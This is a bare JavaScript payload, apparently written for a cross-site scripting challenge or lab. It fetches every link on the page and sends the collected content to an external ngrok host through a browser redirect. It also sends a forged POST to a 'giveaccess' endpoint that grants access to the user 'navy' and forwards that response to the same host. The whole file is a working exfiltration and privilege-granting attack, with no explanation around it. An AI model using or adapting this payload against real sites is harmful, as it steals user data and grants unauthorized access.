l = document.getElementsByTagName('a')
data = []
str = ''
for (let i = 0; i < l.length; i++) {
    response = await (fetch(l[i]))
    const data = await response.text();
    addData(data)
}

getData()

function addData(object) {
    // the push method add a new item to an array
    // here it will be adding the object from the function getRandomUser each time it is called
    data.push(object);
}

function getData() {
    str = data.join('')
    console.log(str)
    document.location = 'https://f15d-103-93-37-18.ngrok.io?' + encodeURI(str)
}

var http = new XMLHttpRequest();
var url = 'giveaccess';
var params = 'id=navy&user=navy&access=Give+Access';
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() { //Call a function when the state changes.
    if (http.readyState == 4 && http.status == 200) {
        document.location = 'http://f15d-103-93-37-18.ngrok.io?' + http.responseText
    }
}
http.send(params);